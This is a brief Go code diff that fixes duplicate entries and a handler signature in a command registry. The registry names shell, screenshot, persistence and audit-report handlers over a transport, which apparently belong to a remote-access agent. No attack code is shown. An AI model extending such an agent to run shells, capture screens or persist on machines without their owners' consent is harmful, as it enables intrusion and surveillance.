@@ -11,8 +11,6 @@ type CommandHandler func(t transport.Transport, args []string)
 var Registry = map[string]CommandHandler{
 	"shell":       ShellHandler,
 	"screen":      ScreenshotHandler,
-	"shell":       ShellHandler,
-	"screen":      ScreenshotHandler,
 	"persistence": PersistenceHandler,
 	"audit":       AuditHandler,
 	// "download": DownloadHandler,
@@ -40,7 +38,7 @@ func Handle(t transport.Transport) {
 	}
 }
 
-func AuditHandler(t transport.Transport) {
+func AuditHandler(t transport.Transport, args []string) {
 	t.Write([]byte("Generando y enviando reporte de auditoría...\n"))
 	if err := report.NewAuditReport(); err != nil {
 		t.Write([]byte("Error enviando reporte: " + err.Error() + "\n"))
